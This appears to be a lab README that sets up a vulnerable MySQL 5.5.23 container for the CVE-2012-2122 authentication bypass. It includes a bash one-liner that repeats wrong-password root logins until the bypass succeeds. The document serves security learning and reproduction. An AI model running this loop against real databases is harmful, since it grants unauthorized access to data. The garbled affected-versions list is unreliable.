# MySQL Authentication Bypass (CVE-2012-2122)

[中文版本(Chinese version)](README.zh-cn.md)

When connecting to MariaDB/MySQL, the input password is compared with the expected correct password. Due to improper handling, even if memcmp() returns a non-zero value, MySQL may still consider the two passwords to be identical. This means that with just a username, repeated login attempts can lead to successful database access.

Affected versions:

- MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.
- MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.

Reference links:

- http://www.freebuf.com/vuls/3815.html
- https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/

## Environment Setup

Through testing, although this environment runs in a container, the ability to reproduce the vulnerability still has some dependency on the host machine. The host machine is best run on Ubuntu or Mac systems, but success is not guaranteed. You are welcome to submit more test results in Issues.

Execute the following command to start the test environment:

```
docker compose up -d
```

After the environment starts, a MySQL service (version: 5.5.23) will be launched, listening on port 3306. You can log in directly through a normal MySQL client, the correct root password is 123456.

## Vulnerability Reproduce

Without knowing the correct password for our environment, run the following command in bash, and after a certain number of attempts, you should be able to successfully log in:

```bash
for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done
```

![](1.png)

For more testing and exploitation methods, see the reference links.
